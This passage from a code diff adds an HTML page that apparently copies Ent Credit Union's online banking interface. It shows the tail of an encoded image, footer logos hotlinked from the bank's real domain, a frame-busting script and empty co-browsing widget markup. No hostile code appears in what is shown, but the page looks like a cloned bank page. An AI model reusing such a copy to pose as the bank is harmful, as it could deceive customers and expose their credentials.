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"
+                      alt="Equal Housing Lender"
+                      height="25"
+                    /><img
+                      src="https://online.ent.com/Banking/hlm/Ent.React.Template/media/images/ncua.c8630dbf.png"
+                      alt="NCUA"
+                      height="25"
+                    />
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div id="form-div" style="display: none"></div>
+      </div>
+    </div>
+    <script>
+      setTimeout(function () {
+        if (self == top)
+          document.getElementById("root").style.display = "block";
+        else top.location = self.location;
+      });
+    </script>
+    <div
+      id="inauth_font_detector"
+      style="visibility: hidden; position: absolute; top: 0px; left: -999px"
+    ></div>
+    <div id="salemove" class="salemove" style="display: none">
+      <div class="sm-visitor-app-container" id="sm-visitor-app-container">
+        <div
+          style="
+            --theme-color: #4d5254;
+            --theme-color-rgb: 77, 82, 84;
+            --theme-color-darker: #454a4c;
+          "
+        >
+          <div class="sm-touch-draggable sm-touch-draggable-lower-right">
+            <div class="sm-visitor-app">
+              <span
+                ><div class="sm-reactive-interface">
+                  <span><span></span></span></div
+              ></span>
+            </div>
+          </div>
+          <span></span>
+          <div class="omnibrowse">
+            <div
+              class="ob-visitor-container"
+              style="
+                --theme-color: #4d5254;
+                --theme-color-rgb: 77, 82, 84;
+                --theme-color-darker: #454a4c;
+              "
+            >
+              <div
+                class="ob-screenshare"
+                style="transform: translate3d(0px, 0px, 0px)"
+              >
+                <div class="sm-screen-reader-only" aria-live="polite"></div>
+                <div class="sm-screen-reader-only" aria-live="polite"></div>
+                <span></span>
+              </div>
+              <div
+                class="ob-screenshare-visitor"
+                style="transform: translate3d(0px, 0px, 0px)"
+              >
+                <div class="sm-screen-reader-only" aria-live="polite"></div>
+                <div class="sm-screen-reader-only" aria-live="polite"></div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="sm-screen-reader-only" role="alert"></div>
+        <div class="sm-screen-reader-only" aria-live="polite"></div>
+      </div>
+      <div id="omnibrowse" class="omnibrowse">
+        <div
+          class="ob-visitor-container"
+          style="
+            --theme-color: #4d5254;
+            --theme-color-rgb: 77, 82, 84;
+            --theme-color-darker: #454a4c;
+          "
+        >
+          <div class="sm-screen-reader-only" aria-live="polite"></div>
+          <div
+            class="ob-media sm_cobrowsing_hidden_field"
+            style="transform: translate3d(0px, 0px, 0px)"
+          >
+            <div class="sm-screen-reader-only" aria-live="polite"></div>
+            <div class="sm-screen-reader-only" aria-live="polite"></div>
+            <span></span>
+          </div>
+          <div class="ob-visitor-app undefined">
+            <span><span></span></span>
+          </div>
+          <div class="ob-visitor-app">
+            <span><span></span></span>
+          </div>
+          <div
+            class="ob-screenshare"
+            style="transform: translate3d(0px, 0px, 0px)"
+          >
+            <div class="sm-screen-reader-only" aria-live="polite"></div>
+            <div class="sm-screen-reader-only" aria-live="polite"></div>
+            <span></span>
+          </div>
+          <div
+            class="ob-screenshare-visitor"
+            style="transform: translate3d(0px, 0px, 0px)"
+          >
+            <div class="sm-screen-reader-only" aria-live="polite"></div>
+            <div class="sm-screen-reader-only" aria-live="polite"></div>
+          </div>
+        </div>
+        <div class="sm-screen-reader-only" role="alert"></div>
+        <div class="sm-screen-reader-only" aria-live="polite"></div>
+      </div>
+    </div>
+    <span id="cobrowsing-mouse-container"></span>
+  </body>
+</html>
